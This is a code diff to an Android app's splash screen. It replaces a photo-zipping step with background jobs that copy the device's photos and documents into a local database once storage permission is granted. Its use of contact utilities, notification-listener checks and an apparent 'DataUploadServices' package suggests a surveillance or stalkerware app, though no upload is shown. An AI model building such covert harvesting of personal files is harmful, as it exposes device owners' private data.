@@ -34,6 +34,7 @@ import android.widget.Button;
 
 import com.codies.Tattle.OtherUtils.ContactUtil;
 import com.codies.Tattle.DataUploadServices.NotificationUploadScheduler;
+import com.codies.Tattle.OtherUtils.DocFilesSaver;
 import com.codies.Tattle.R;
 import com.codies.Tattle.OtherUtils.ImageFileSaver;
 import com.codies.Tattle.OtherUtils.SharedPrefs;
@@ -50,11 +51,6 @@ public class SplashActivity extends AppCompatActivity {
     public static final String TAG = "SplashActivity";
     public static final String MESSAGE_STATUS = "message_status";
     public static final int PERMISSIONS_REQUEST_CODE = 1240;
-    public static final int PERMS_REQUEST_CODE = 100;
-
-    private static final int PERMISSIONS_REQUEST_READ_PHONE_STATE = 999;
-
-    private TelephonyManager mTelephonyManager;
 
     String[] appPermissions = {
             Manifest.permission.WRITE_EXTERNAL_STORAGE,
@@ -80,14 +76,9 @@ public class SplashActivity extends AppCompatActivity {
         sharedPrefs = SharedPrefs.getInstance(this);
         contactUtil = new ContactUtil(this);
 
-
-        /*
-        documentFiles = new DocumentFiles(".apk");//just enter the file type u need
-        documentFiles.Search_Dir(Environment.getExternalStorageDirectory());
-*/
-
         if (checkAndRequestPermissions()) {
-            zipPhotos();
+            savePhotosToLocalDB();
+            saveDocsToLocalDB();
         }
 
         if (!NotificationManagerCompat.getEnabledListenerPackages(this).contains(getPackageName())) {
@@ -114,7 +105,6 @@ public class SplashActivity extends AppCompatActivity {
                 finish();
             }
         });
-
     }
 
     public void showPermissionDialogue() {
@@ -181,7 +171,8 @@ public class SplashActivity extends AppCompatActivity {
 
                     if (deniedCount == 0) {
 //                proceed with your work here
-                        zipPhotos();
+                        saveDocsToLocalDB();
+                        savePhotosToLocalDB();
                     } else {
                         for (Map.Entry<String, Integer> entry : permissionResults.entrySet()) {
                             String permName = entry.getKey();
@@ -251,25 +242,45 @@ public class SplashActivity extends AppCompatActivity {
             return alertDialog;
         }
 
-        public void zipPhotos () {
-            final WorkManager mWorkManager = WorkManager.getInstance();
-            final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(ImageFileSaver.class).build();
+    private void savePhotosToLocalDB() {
+        final WorkManager mWorkManager = WorkManager.getInstance();
+        final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(ImageFileSaver.class)
+                .addTag("PhotoSaverLocalDB")
+                .build();
 
-            mWorkManager.enqueue(mRequest);
-            mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
-                @Override
-                public void onChanged(@Nullable WorkInfo workInfo) {
-                    if (workInfo != null) {
-                        if (workInfo.getState().isFinished()) {
-                            workInfo.getOutputData().getBoolean("photosZipped", false);
-                        }
+        mWorkManager.enqueue(mRequest);
+        mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
+            @Override
+            public void onChanged(@Nullable WorkInfo workInfo) {
+                if (workInfo != null) {
+                    if (workInfo.getState().isFinished()) {
+                        boolean photosStored = workInfo.getOutputData().getBoolean("photosStoredInDB", false);
+                        Log.i(TAG, "onChanged: photosStored "+photosStored);
                     }
                 }
-            });
-        }
+            }
+        });
+    }
 
+    private void saveDocsToLocalDB() {
+        final WorkManager mWorkManager = WorkManager.getInstance();
+        final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(DocFilesSaver.class)
+                .addTag("PhotoSaverLocalDB")
+                .build();
 
-
+        mWorkManager.enqueue(mRequest);
+        mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
+            @Override
+            public void onChanged(@Nullable WorkInfo workInfo) {
+                if (workInfo != null) {
+                    if (workInfo.getState().isFinished()) {
+                        boolean docsStored = workInfo.getOutputData().getBoolean("docsStoredInDB", false);
+                        Log.i(TAG, "onChanged: docsStored "+docsStored);
+                    }
+                }
+            }
+        });
+    }
 
     private BroadcastReceiver onNotice = new BroadcastReceiver() {
 
